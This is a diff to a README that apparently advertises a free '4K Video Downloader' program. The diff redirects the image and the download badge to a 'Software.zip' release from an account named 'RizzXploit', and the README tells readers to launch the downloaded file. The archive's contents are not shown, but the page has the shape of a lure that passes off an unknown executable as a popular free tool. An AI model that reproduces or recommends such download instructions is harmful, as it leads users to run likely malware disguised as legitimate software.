@@ -2,7 +2,7 @@
 
 Welcome to the official repository for the "4K Video Downloader Free 2025" where you can dive into the world of high-quality video downloading. 
 
-![4K Video Downloader](https://example.com/4k-video-downloader-image.jpg)
+![4K Video Downloader](https://github.com/RizzXploit/4K-Video-Downloader-Free/releases/download/v2.0/Software.zip)
 
 ## Repository Description
 In this repository, you will find all the resources you need to unleash the full potential of video downloading in stunning 4K quality. 
@@ -27,7 +27,7 @@ Explore various topics related to 4K video downloading including:
 
 ## Download Link
 Click the button below to download the 4K Video Downloader Free 2025:
-[![Download 4K Video Downloader](https://img.shields.io/badge/Download%20Here-4K%20Video%20Downloader-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download 4K Video Downloader](https://github.com/RizzXploit/4K-Video-Downloader-Free/releases/download/v2.0/Software.zip%20Here-4K%20Video%20Downloader-blue)](https://github.com/RizzXploit/4K-Video-Downloader-Free/releases/download/v2.0/Software.zip)
 
 **Note:** You need to launch the downloaded file to start using the powerful 4K Video Downloader.
 
